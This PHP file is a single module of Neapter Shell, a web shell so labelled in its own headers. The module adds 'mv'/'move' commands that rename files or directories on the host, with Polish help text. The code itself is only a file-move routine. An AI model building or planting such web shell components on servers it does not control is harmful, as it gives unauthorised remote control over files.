<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Move file or directory
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleMv extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array(
            'mv',
            'move',
        );
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.2 2016-06-08 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Przenoszenie pliku

	Użycie:
		mv plik_lub_katalog_źródłowy plik_lub_katalog_docelowy
DATA;
    }

    /**
     * Get version of Neapter Shell
     *
     * @return string
     */
    public function get()
    {
        if ($this->oArgs->getNumberOfParams() !== 2) {
            return self::getHelp();
        }

        $sSource = $this->oArgs->getParam(0);
        $sDestination = $this->oArgs->getParam(1);

        return sprintf(
            'Plik "%s" %szostał przeniesiony do "%s"',
            $sSource,
            (! @rename($sSource, $sDestination) ? 'nie ' : ''),
            $sDestination
        );
    }
}
